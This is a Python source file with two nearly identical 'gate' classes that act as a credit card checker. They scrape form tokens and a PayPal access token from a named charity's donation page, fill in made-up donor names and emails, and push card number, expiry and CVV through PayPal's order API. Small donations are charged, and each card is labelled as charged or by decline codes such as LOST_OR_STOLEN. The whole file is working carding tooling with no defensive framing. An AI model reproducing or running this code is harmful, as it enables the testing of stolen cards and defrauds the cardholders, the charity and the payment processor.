import random
import requests
import base64
import re
import urllib3
import json
from user_agent import generate_user_agent
from requests_toolbelt.multipart.encoder import MultipartEncoder
# Disable SSL warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

class paypal_custom1:
    def __init__(self):
        self.session = requests.Session()
        self.user_agent = generate_user_agent()
        self.base_url = 'https://estiaagiosnikolaos.org'
        self.donate_url = f'{self.base_url}/donations/help-the-cause-2/'
        self.min_amount = '1.00'
        self.donation_amount = '5.00'
        self.gate_name = 'PayPal_Custom'
        
    def generate_random_name(self):
        """Generate random first and last name"""
        first_names = ["James", "John", "Robert", "Michael", "William", 
                      "David", "Richard", "Joseph", "Thomas", "Charles"]
        last_names = ["Smith", "Johnson", "Williams", "Brown", "Jones", 
                     "Garcia", "Miller", "Davis", "Rodriguez", "Martinez"]
        
        first_name = random.choice(first_names)
        last_name = random.choice(last_names)
        return first_name, last_name
    
    def generate_email(self, first_name, last_name):
        """Generate random email"""
        return f"{first_name.lower()}{last_name.lower()}{random.randint(100, 999)}@gmail.com"
    
    def parse_credit_card(self, cc_data):
        """Parse credit card data from string format"""
        cc_data = cc_data.strip()
        parts = cc_data.split("|")
        
        card_number = parts[0]
        month = parts[1]
        year = parts[2]
        cvv = parts[3].strip()
        
        # Handle year format
        if "20" in year:
            year = year.split("20")[1]
            
        return card_number, month, year, cvv
    
    def get_page_data(self):
        """Get initial page data and extract form information"""
        headers = {
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
            'accept-language': 'ar-EG,ar;q=0.9,en-EG;q=0.8,en;q=0.7,en-US;q=0.6',
            'cache-control': 'max-age=0',
            'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'none',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
            'user-agent': self.user_agent,
        }
        
        response = self.session.get(self.donate_url, cookies=self.session.cookies, headers=headers)
        
        # Extract form data
        form_data = {}
        
        id_form1_match = re.search(r'name="give-form-id-prefix" value="(.*?)"', response.text)
        if id_form1_match:
            form_data['id_form1'] = id_form1_match.group(1)
        
        id_form2_match = re.search(r'name="give-form-id" value="(.*?)"', response.text)
        if id_form2_match:
            form_data['id_form2'] = id_form2_match.group(1)
        
        nonec_match = re.search(r'name="give-form-hash" value="(.*?)"', response.text)
        if nonec_match:
            form_data['nonec'] = nonec_match.group(1)
        
        # Extract and decode token
        enc_match = re.search(r'"data-client-token":"(.*?)"', response.text)
        if enc_match:
            enc = enc_match.group(1)
            dec = base64.b64decode(enc).decode('utf-8')
            access_token_match = re.search(r'"accessToken":"(.*?)"', dec)
            if access_token_match:
                form_data['access_token'] = access_token_match.group(1)
        
        return form_data
    
    def process_initial_donation(self, form_data, first_name, last_name, email):
        """Process initial donation setup"""
        headers = {
            'accept': '*/*',
            'accept-language': 'ar-EG,ar;q=0.9,en-EG;q=0.8,en;q=0.7,en-US;q=0.6',
            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36',
            'x-requested-with': 'XMLHttpRequest',
        }
        
        data = [
            ('give-honeypot', ''),
            ('give-price-id', 'custom'),
            ('give-form-id-prefix', form_data['id_form1']),
            ('give-form-id', form_data['id_form2']),
            ('give-form-title', 'Donate'),
            ('give-current-url', self.donate_url),
            ('give-form-url', self.donate_url),
            ('give-form-minimum', self.min_amount),
            ('give-form-maximum', '999999.99'),
            ('give-form-hash', form_data['nonec']),
            ('give-amount', self.donation_amount),
            ('give_stripe_payment_method', ''),
            ('payment-mode', 'paypal-commerce'),
            ('give_first', first_name),
            ('give_last', last_name),
            ('give_company_option', 'no'),
            ('give_company_name', ''),
            ('give_email', email),
            ('give_comment', ''),
            ('card_name', f"{first_name},{last_name}"),
            ('card_exp_month', ''),
            ('card_exp_year', ''),
            ('give_agree_to_terms', '1'),
            ('give_action', 'purchase'),
            ('give-gateway', 'paypal-commerce'),
            ('action', 'give_process_donation'),
            ('give_ajax', 'true'),
        ]
        
        response = self.session.post(f'{self.base_url}/wp-admin/admin-ajax.php', 
                                     cookies=self.session.cookies, headers=headers, data=data)
        return response
    
    def create_paypal_order(self, form_data, first_name, last_name, email):
        """Create PayPal order"""
        headers = {
            'accept': '*/*',
            'accept-language': 'ar-EG,ar;q=0.9,en-EG;q=0.8,en;q=0.7,en-US;q=0.6',
            'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': self.user_agent,
        }
        
        params = {'action': 'give_paypal_commerce_create_order'}
        
        multipart_data = MultipartEncoder([
            ('give-honeypot', (None, '')),
            ('give-price-id', (None, 'custom')),
            ('give-form-id-prefix', (None, form_data['id_form1'])),
            ('give-form-id', (None, form_data['id_form2'])),
            ('give-form-title', (None, 'Donate')),
            ('give-current-url', (None, self.donate_url)),
            ('give-form-url', (None, self.donate_url)),
            ('give-form-minimum', (None, self.min_amount)),
            ('give-form-maximum', (None, '999999.99')),
            ('give-form-hash', (None, form_data['nonec'])),
            ('give-amount', (None, self.donation_amount)),
            ('give_stripe_payment_method', (None, '')),
            ('payment-mode', (None, 'paypal-commerce')),
            ('give_first', (None, first_name)),
            ('give_last', (None, last_name)),
            ('give_company_option', (None, 'no')),
            ('give_company_name', (None, '')),
            ('give_email', (None, email)),
            ('give_comment', (None, '')),
            ('card_name', (None, f"{first_name},{last_name}")),
            ('card_exp_month', (None, '')),
            ('card_exp_year', (None, '')),
            ('give_agree_to_terms', (None, '1')),
            ('give-gateway', (None, 'paypal-commerce')),
        ])
        
        headers['content-type'] = multipart_data.content_type
        
        response = self.session.post(
            f'{self.base_url}/wp-admin/admin-ajax.php',
            params=params,
            cookies=self.session.cookies,
            headers=headers,
            data=multipart_data
        )
        
        response_json = response.json()
        return response_json['data']['id']
    
    def confirm_payment_source(self, token, access_token, card_number, month, year, cvv):
        """Confirm payment source with PayPal"""
        headers = {
            'authority': 'cors.api.paypal.com',
            'accept': '*/*',
            'accept-language': 'ar-EG,ar;q=0.9,en-EG;q=0.8,en;q=0.7,en-US;q=0.6',
            'authorization': f'Bearer {access_token}',
            'braintree-sdk-version': '3.32.0-payments-sdk-dev',
            'content-type': 'application/json',
            'origin': 'https://assets.braintreegateway.com',
            'paypal-client-metadata-id': '739b1263dc2b6bec1e7d9b8ae229ec25',
            'referer': 'https://assets.braintreegateway.com/',
            'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'cross-site',
            'user-agent': self.user_agent,
        }
        
        json_data = {
            'payment_source': {
                'card': {
                    'number': card_number,
                    'expiry': f'20{year}-{month}',
                    'security_code': cvv,
                    'attributes': {
                        'verification': {
                            'method': 'SCA_WHEN_REQUIRED',
                        },
                    },
                },
            },
            'application_context': {
                'vault': False,
            },
        }
        
        response = self.session.post(
            f'https://cors.api.paypal.com/v2/checkout/orders/{token}/confirm-payment-source',
            headers=headers,
            json=json_data,
        )
        
        try:
            data = response.json()
        except Exception as e:
            return f"JSON Error: {str(e)}", self.gate_name
            
        if data.get("error") == "invalid_token":
            return "GATE ERROR TOKEN", self.gate_name
            
        if data.get("name") == "UNPROCESSABLE_ENTITY" or data.get("details"):
            issue = None
            description = None
            if data.get("details"):
                issue = data["details"][0].get("issue")
                description = data["details"][0].get("description")
                error_message = f"{description}"
                return error_message, self.gate_name

        if data.get("status") == "APPROVED":
            pass
        
        return response
    
    def approve_order(self, token, form_data, first_name, last_name, email):
        """Approve the order"""
        headers = {
            'accept': '*/*',
            'accept-language': 'ar-EG,ar;q=0.9,en-EG;q=0.8,en;q=0.7,en-US;q=0.6',
            'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': self.user_agent,
        }
        
        params = {
            'action': 'give_paypal_commerce_approve_order',
            'order': token,
        }
        
        multipart_data = MultipartEncoder([
            ('give-honeypot', (None, '')),
            ('give-price-id', (None, 'custom')),
            ('give-form-id-prefix', (None, form_data['id_form1'])),
            ('give-form-id', (None, form_data['id_form2'])),
            ('give-form-title', (None, 'Donate')),
            ('give-current-url', (None, self.donate_url)),
            ('give-form-url', (None, self.donate_url)),
            ('give-form-minimum', (None, self.min_amount)),
            ('give-form-maximum', (None, '999999.99')),
            ('give-form-hash', (None, form_data['nonec'])),
            ('give-amount', (None, self.donation_amount)),
            ('give_stripe_payment_method', (None, '')),
            ('payment-mode', (None, 'paypal-commerce')),
            ('give_first', (None, first_name)),
            ('give_last', (None, last_name)),
            ('give_company_option', (None, 'no')),
            ('give_company_name', (None, '')),
            ('give_email', (None, email)),
            ('give_comment', (None, '')),
            ('card_name', (None, f"{first_name},{last_name}")),
            ('card_exp_month', (None, '')),
            ('card_exp_year', (None, '')),
            ('give_agree_to_terms', (None, '1')),
            ('give-gateway', (None, 'paypal-commerce')),
        ])
        
        headers['content-type'] = multipart_data.content_type
        
        response = self.session.post(
            f'{self.base_url}/wp-admin/admin-ajax.php',
            params=params,
            cookies=self.session.cookies,
            headers=headers,
            data=multipart_data
        )
        
        return response
    
    def get_decline_reason(self, text):
        """Parse decline reason from response"""
        decline_patterns = {
            'true': '𝐂𝐡𝐚𝐫𝐠𝐞𝐝 𝟏.𝟎𝟎$',
            'COMPLETED': '𝐂𝐡𝐚𝐫𝐠𝐞𝐝 𝟏.𝟎𝟎$',
            'DO_NOT_HONOR': 'DO_NOT_HONOR',
            'ACCOUNT_CLOSED': 'ACCOUNT_CLOSED',
            'PAYER_ACCOUNT_LOCKED_OR_CLOSED': 'PAYER_ACCOUNT_LOCKED_OR_CLOSED',
            'LOST_OR_STOLEN': 'LOST_OR_STOLEN',
            'CVV2_FAILURE': 'CVV2_FAILURE',
            'SUSPECTED_FRAUD': 'SUSPECTED_FRAUD',
            'INVALID_ACCOUNT': 'INVALID_ACCOUNT',
            'REATTEMPT_NOT_PERMITTED': 'REATTEMPT_NOT_PERMITTED',
            'ACCOUNT_BLOCKED_BY_ISSUER': 'ACCOUNT_BLOCKED_BY_ISSUER',
            'ORDER_NOT_APPROVED': 'ORDER_NOT_APPROVED',
            'PICKUP_CARD_SPECIAL_CONDITIONS': 'PICKUP_CARD_SPECIAL_CONDITIONS',
            'PAYER_CANNOT_PAY': 'PAYER_CANNOT_PAY',
            'INSUFFICIENT_FUNDS': 'INSUFFICIENT_FUNDS',
            'GENERIC_DECLINE': 'GENERIC_DECLINE',
            'COMPLIANCE_VIOLATION': 'COMPLIANCE_VIOLATION',
            'TRANSACTION_NOT_PERMITTED': 'TRANSACTION_NOT_PERMITTED',
            'PAYMENT_DENIED': 'PAYMENT_DENIED',
            'INVALID_TRANSACTION': 'INVALID_TRANSACTION',
            'RESTRICTED_OR_INACTIVE_ACCOUNT': 'RESTRICTED_OR_INACTIVE_ACCOUNT',
            'SECURITY_VIOLATION': 'SECURITY_VIOLATION',
            'DECLINED_DUE_TO_UPDATED_ACCOUNT': 'DECLINED_DUE_TO_UPDATED_ACCOUNT',
            'INVALID_OR_RESTRICTED_CARD': 'INVALID_OR_RESTRICTED_CARD',
            'EXPIRED_CARD': 'EXPIRED_CARD',
            'CRYPTOGRAPHIC_FAILURE': 'CRYPTOGRAPHIC_FAILURE',
            'TRANSACTION_CANNOT_BE_COMPLETED': 'TRANSACTION_CANNOT_BE_COMPLETED',
            'DECLINED_PLEASE_RETRY': 'DECLINED_PLEASE_RETRY_LATER',
            'TX_ATTEMPTS_EXCEED_LIMIT': 'TX_ATTEMPTS_EXCEED_LIMIT',
        }
        
        for pattern, message in decline_patterns.items():
            if pattern in text:
                return message
        
        try:
            # Try to parse as JSON if not found in patterns
            result = json.loads(text)
            if 'data' in result and 'error' in result['data']:
                return result['data']['error']
        except:
            pass
            
        return 'UNKNOWN_ERROR'
    
    def check_card(self, cc_data):
        """Main method to check credit card"""
        try:
            # Parse credit card data
            card_number, month, year, cvv = self.parse_credit_card(cc_data)
            
            # Generate random name and email
            first_name, last_name = self.generate_random_name()
            email = self.generate_email(first_name, last_name)
            
            # Get initial page data
            form_data = self.get_page_data()
            
            # Process initial donation
            self.process_initial_donation(form_data, first_name, last_name, email)
            
            # Create PayPal order
            token = self.create_paypal_order(form_data, first_name, last_name, email)
            
            # Confirm payment source
            confirm_result = self.confirm_payment_source(token, form_data['access_token'], 
                                                         card_number, month, year, cvv)
            
            # Check if confirm_payment_source returned an error message
            if isinstance(confirm_result, tuple) and len(confirm_result) == 2:
                return confirm_result[0]  # Return error message
            
            # Approve order
            response = self.approve_order(token, form_data, first_name, last_name, email)
            
            # Parse and return result
            result = self.get_decline_reason(response.text)
            
            # Check for completed status
            if 'true' in response.text:
                try:
                    data = response.json()
                    if 'data' in data and 'order' in data['data']:
                        purchase_units = data['data']['order'].get('purchase_units', [])
                        if purchase_units:
                            payments = purchase_units[0].get('payments', {})
                            captures = payments.get('captures', [])
                            if captures:
                                last_status = captures[-1].get('status', '')
                                if last_status == 'COMPLETED':
                                    return '𝐂𝐡𝐚𝐫𝐠𝐞𝐝 𝟏.𝟎𝟎$'
                except:
                    pass
            
            return result
            
        except Exception as e:
            return f"ERROR: {str(e)}"
        
import random
import requests
import base64
import re
import urllib3
import json
from user_agent import generate_user_agent
from requests_toolbelt.multipart.encoder import MultipartEncoder

# Disable SSL warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

class paypal_custom2:
    def __init__(self):
        self.session = requests.Session()
        self.user_agent = generate_user_agent()
        self.base_url = 'https://estiaagiosnikolaos.org'
        self.donate_url = f'{self.base_url}/donations/help-the-cause-2/'
        self.min_amount = '0.01'
        self.donation_amount = '0.05'
        self.gate_name = 'PayPal_Custom2'
        
    def generate_random_name(self):
        """Generate random first and last name"""
        first_names = ["James", "John", "Robert", "Michael", "William", 
                      "David", "Richard", "Joseph", "Thomas", "Charles"]
        last_names = ["Smith", "Johnson", "Williams", "Brown", "Jones", 
                     "Garcia", "Miller", "Davis", "Rodriguez", "Martinez"]
        
        first_name = random.choice(first_names)
        last_name = random.choice(last_names)
        return first_name, last_name
    
    def generate_email(self, first_name, last_name):
        """Generate random email"""
        return f"{first_name.lower()}{last_name.lower()}{random.randint(100, 999)}@gmail.com"
    
    def parse_credit_card(self, cc_data):
        """Parse credit card data from string format"""
        cc_data = cc_data.strip()
        parts = cc_data.split("|")
        
        card_number = parts[0]
        month = parts[1]
        year = parts[2]
        cvv = parts[3].strip()
        
        # Handle year format
        if "20" in year:
            year = year.split("20")[1]
            
        return card_number, month, year, cvv
    
    def get_page_data(self):
        """Get initial page data and extract form information"""
        headers = {
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
            'accept-language': 'ar-EG,ar;q=0.9,en-EG;q=0.8,en;q=0.7,en-US;q=0.6',
            'cache-control': 'max-age=0',
            'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'none',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
            'user-agent': self.user_agent,
        }
        
        response = self.session.get(self.donate_url, cookies=self.session.cookies, headers=headers)
        
        # Extract form data with error handling
        form_data = {}
        
        id_form1_match = re.search(r'name="give-form-id-prefix" value="(.*?)"', response.text)
        if id_form1_match:
            form_data['id_form1'] = id_form1_match.group(1)
        
        id_form2_match = re.search(r'name="give-form-id" value="(.*?)"', response.text)
        if id_form2_match:
            form_data['id_form2'] = id_form2_match.group(1)
        
        nonec_match = re.search(r'name="give-form-hash" value="(.*?)"', response.text)
        if nonec_match:
            form_data['nonec'] = nonec_match.group(1)
        
        # Extract and decode token
        enc_match = re.search(r'"data-client-token":"(.*?)"', response.text)
        if enc_match:
            enc = enc_match.group(1)
            dec = base64.b64decode(enc).decode('utf-8')
            access_token_match = re.search(r'"accessToken":"(.*?)"', dec)
            if access_token_match:
                form_data['access_token'] = access_token_match.group(1)
        
        return form_data
    
    def process_initial_donation(self, form_data, first_name, last_name, email):
        """Process initial donation setup"""
        headers = {
            'accept': '*/*',
            'accept-language': 'ar-EG,ar;q=0.9,en-EG;q=0.8,en;q=0.7,en-US;q=0.6',
            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36',
            'x-requested-with': 'XMLHttpRequest',
        }
        
        data = [
            ('give-honeypot', ''),
            ('give-price-id', 'custom'),
            ('give-form-id-prefix', form_data['id_form1']),
            ('give-form-id', form_data['id_form2']),
            ('give-form-title', 'Donate'),
            ('give-current-url', self.donate_url),
            ('give-form-url', self.donate_url),
            ('give-form-minimum', self.min_amount),
            ('give-form-maximum', '999999.99'),
            ('give-form-hash', form_data['nonec']),
            ('give-amount', self.donation_amount),
            ('give_stripe_payment_method', ''),
            ('payment-mode', 'paypal-commerce'),
            ('give_first', first_name),
            ('give_last', last_name),
            ('give_company_option', 'no'),
            ('give_company_name', ''),
            ('give_email', email),
            ('give_comment', ''),
            ('card_name', f"{first_name},{last_name}"),
            ('card_exp_month', ''),
            ('card_exp_year', ''),
            ('give_agree_to_terms', '1'),
            ('give_action', 'purchase'),
            ('give-gateway', 'paypal-commerce'),
            ('action', 'give_process_donation'),
            ('give_ajax', 'true'),
        ]
        
        response = self.session.post(f'{self.base_url}/wp-admin/admin-ajax.php', 
                                     cookies=self.session.cookies, headers=headers, data=data)
        return response
    
    def create_paypal_order(self, form_data, first_name, last_name, email):
        """Create PayPal order"""
        headers = {
            'accept': '*/*',
            'accept-language': 'ar-EG,ar;q=0.9,en-EG;q=0.8,en;q=0.7,en-US;q=0.6',
            'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': self.user_agent,
        }
        
        params = {'action': 'give_paypal_commerce_create_order'}
        
        multipart_data = MultipartEncoder([
            ('give-honeypot', (None, '')),
            ('give-price-id', (None, 'custom')),
            ('give-form-id-prefix', (None, form_data['id_form1'])),
            ('give-form-id', (None, form_data['id_form2'])),
            ('give-form-title', (None, 'Donate')),
            ('give-current-url', (None, self.donate_url)),
            ('give-form-url', (None, self.donate_url)),
            ('give-form-minimum', (None, self.min_amount)),
            ('give-form-maximum', (None, '999999.99')),
            ('give-form-hash', (None, form_data['nonec'])),
            ('give-amount', (None, self.donation_amount)),
            ('give_stripe_payment_method', (None, '')),
            ('payment-mode', (None, 'paypal-commerce')),
            ('give_first', (None, first_name)),
            ('give_last', (None, last_name)),
            ('give_company_option', (None, 'no')),
            ('give_company_name', (None, '')),
            ('give_email', (None, email)),
            ('give_comment', (None, '')),
            ('card_name', (None, f"{first_name},{last_name}")),
            ('card_exp_month', (None, '')),
            ('card_exp_year', (None, '')),
            ('give_agree_to_terms', (None, '1')),
            ('give-gateway', (None, 'paypal-commerce')),
        ])
        
        headers['content-type'] = multipart_data.content_type
        
        response = self.session.post(
            f'{self.base_url}/wp-admin/admin-ajax.php',
            params=params,
            cookies=self.session.cookies,
            headers=headers,
            data=multipart_data
        )
        
        response_json = response.json()
        return response_json['data']['id']
    
    def confirm_payment_source(self, token, access_token, card_number, month, year, cvv):
        """Confirm payment source with PayPal"""
        headers = {
            'authority': 'cors.api.paypal.com',
            'accept': '*/*',
            'accept-language': 'ar-EG,ar;q=0.9,en-EG;q=0.8,en;q=0.7,en-US;q=0.6',
            'authorization': f'Bearer {access_token}',
            'braintree-sdk-version': '3.32.0-payments-sdk-dev',
            'content-type': 'application/json',
            'origin': 'https://assets.braintreegateway.com',
            'paypal-client-metadata-id': '739b1263dc2b6bec1e7d9b8ae229ec25',
            'referer': 'https://assets.braintreegateway.com/',
            'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'cross-site',
            'user-agent': self.user_agent,
        }
        
        json_data = {
            'payment_source': {
                'card': {
                    'number': card_number,
                    'expiry': f'20{year}-{month}',
                    'security_code': cvv,
                    'attributes': {
                        'verification': {
                            'method': 'SCA_WHEN_REQUIRED',
                        },
                    },
                },
            },
            'application_context': {
                'vault': False,
            },
        }
        
        response = self.session.post(
            f'https://cors.api.paypal.com/v2/checkout/orders/{token}/confirm-payment-source',
            headers=headers,
            json=json_data,
        )
        
        try:
            data = response.json()
        except Exception as e:
            return f"JSON Error: {str(e)}", self.gate_name
            
        if data.get("error") == "invalid_token":
            return "GATE ERROR TOKEN", self.gate_name
            
        if data.get("name") == "UNPROCESSABLE_ENTITY" or data.get("details"):
            issue = None
            description = None
            if data.get("details"):
                issue = data["details"][0].get("issue")
                description = data["details"][0].get("description")
                error_message = f"{description}"
                return error_message, self.gate_name

        if data.get("status") == "APPROVED":
            pass
        
        return response
    
    def approve_order(self, token, form_data, first_name, last_name, email):
        """Approve the order"""
        headers = {
            'accept': '*/*',
            'accept-language': 'ar-EG,ar;q=0.9,en-EG;q=0.8,en;q=0.7,en-US;q=0.6',
            'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': self.user_agent,
        }
        
        params = {
            'action': 'give_paypal_commerce_approve_order',
            'order': token,
        }
        
        multipart_data = MultipartEncoder([
            ('give-honeypot', (None, '')),
            ('give-price-id', (None, 'custom')),
            ('give-form-id-prefix', (None, form_data['id_form1'])),
            ('give-form-id', (None, form_data['id_form2'])),
            ('give-form-title', (None, 'Donate')),
            ('give-current-url', (None, self.donate_url)),
            ('give-form-url', (None, self.donate_url)),
            ('give-form-minimum', (None, self.min_amount)),
            ('give-form-maximum', (None, '999999.99')),
            ('give-form-hash', (None, form_data['nonec'])),
            ('give-amount', (None, self.donation_amount)),
            ('give_stripe_payment_method', (None, '')),
            ('payment-mode', (None, 'paypal-commerce')),
            ('give_first', (None, first_name)),
            ('give_last', (None, last_name)),
            ('give_company_option', (None, 'no')),
            ('give_company_name', (None, '')),
            ('give_email', (None, email)),
            ('give_comment', (None, '')),
            ('card_name', (None, f"{first_name},{last_name}")),
            ('card_exp_month', (None, '')),
            ('card_exp_year', (None, '')),
            ('give_agree_to_terms', (None, '1')),
            ('give-gateway', (None, 'paypal-commerce')),
        ])
        
        headers['content-type'] = multipart_data.content_type
        
        response = self.session.post(
            f'{self.base_url}/wp-admin/admin-ajax.php',
            params=params,
            cookies=self.session.cookies,
            headers=headers,
            data=multipart_data
        )
        
        return response
    
    def get_decline_reason(self, text):
        """Parse decline reason from response"""
        decline_patterns = {
            'true': '𝐂𝐡𝐚𝐫𝐠𝐞𝐝 𝟏.𝟎𝟎$',
            'COMPLETED': '𝐂𝐡𝐚𝐫𝐠𝐞𝐝 𝟏.𝟎𝟎$',
            'DO_NOT_HONOR': 'DO_NOT_HONOR',
            'ACCOUNT_CLOSED': 'ACCOUNT_CLOSED',
            'PAYER_ACCOUNT_LOCKED_OR_CLOSED': 'PAYER_ACCOUNT_LOCKED_OR_CLOSED',
            'LOST_OR_STOLEN': 'LOST_OR_STOLEN',
            'CVV2_FAILURE': 'CVV2_FAILURE',
            'SUSPECTED_FRAUD': 'SUSPECTED_FRAUD',
            'INVALID_ACCOUNT': 'INVALID_ACCOUNT',
            'REATTEMPT_NOT_PERMITTED': 'REATTEMPT_NOT_PERMITTED',
            'ACCOUNT_BLOCKED_BY_ISSUER': 'ACCOUNT_BLOCKED_BY_ISSUER',
            'ORDER_NOT_APPROVED': 'ORDER_NOT_APPROVED',
            'PICKUP_CARD_SPECIAL_CONDITIONS': 'PICKUP_CARD_SPECIAL_CONDITIONS',
            'PAYER_CANNOT_PAY': 'PAYER_CANNOT_PAY',
            'INSUFFICIENT_FUNDS': 'INSUFFICIENT_FUNDS',
            'GENERIC_DECLINE': 'GENERIC_DECLINE',
            'COMPLIANCE_VIOLATION': 'COMPLIANCE_VIOLATION',
            'TRANSACTION_NOT_PERMITTED': 'TRANSACTION_NOT_PERMITTED',
            'PAYMENT_DENIED': 'PAYMENT_DENIED',
            'INVALID_TRANSACTION': 'INVALID_TRANSACTION',
            'RESTRICTED_OR_INACTIVE_ACCOUNT': 'RESTRICTED_OR_INACTIVE_ACCOUNT',
            'SECURITY_VIOLATION': 'SECURITY_VIOLATION',
            'DECLINED_DUE_TO_UPDATED_ACCOUNT': 'DECLINED_DUE_TO_UPDATED_ACCOUNT',
            'INVALID_OR_RESTRICTED_CARD': 'INVALID_OR_RESTRICTED_CARD',
            'EXPIRED_CARD': 'EXPIRED_CARD',
            'CRYPTOGRAPHIC_FAILURE': 'CRYPTOGRAPHIC_FAILURE',
            'TRANSACTION_CANNOT_BE_COMPLETED': 'TRANSACTION_CANNOT_BE_COMPLETED',
            'DECLINED_PLEASE_RETRY': 'DECLINED_PLEASE_RETRY_LATER',
            'TX_ATTEMPTS_EXCEED_LIMIT': 'TX_ATTEMPTS_EXCEED_LIMIT',
        }
        
        for pattern, message in decline_patterns.items():
            if pattern in text:
                return message
        
        try:
            # Try to parse as JSON if not found in patterns
            result = json.loads(text)
            if 'data' in result and 'error' in result['data']:
                return result['data']['error']
        except:
            pass
            
        return 'UNKNOWN_ERROR'
    
    def check_card(self, cc_data):
        """Main method to check credit card"""
        try:
            # Parse credit card data
            card_number, month, year, cvv = self.parse_credit_card(cc_data)
            
            # Generate random name and email
            first_name, last_name = self.generate_random_name()
            email = self.generate_email(first_name, last_name)
            
            # Get initial page data
            form_data = self.get_page_data()
            
            # Process initial donation
            self.process_initial_donation(form_data, first_name, last_name, email)
            
            # Create PayPal order
            token = self.create_paypal_order(form_data, first_name, last_name, email)
            
            # Confirm payment source
            confirm_result = self.confirm_payment_source(token, form_data['access_token'], 
                                                        card_number, month, year, cvv)
            
            # Check if confirm_payment_source returned an error message
            if isinstance(confirm_result, tuple) and len(confirm_result) == 2:
                return confirm_result[0]  # Return error message
            
            # Approve order
            response = self.approve_order(token, form_data, first_name, last_name, email)
            
            # Parse and return result
            result = self.get_decline_reason(response.text)
            
            # Check for completed status
            if 'true' in response.text:
                try:
                    data = response.json()
                    if 'data' in data and 'order' in data['data']:
                        purchase_units = data['data']['order'].get('purchase_units', [])
                        if purchase_units:
                            payments = purchase_units[0].get('payments', {})
                            captures = payments.get('captures', [])
                            if captures:
                                last_status = captures[-1].get('status', '')
                                if last_status == 'COMPLETED':
                                    return '𝐂𝐡𝐚𝐫𝐠𝐞𝐝 𝟏.𝟎𝟎$'
                except:
                    pass
            
            return result
            
        except Exception as e:
            return f"ERROR: {str(e)}"
#2
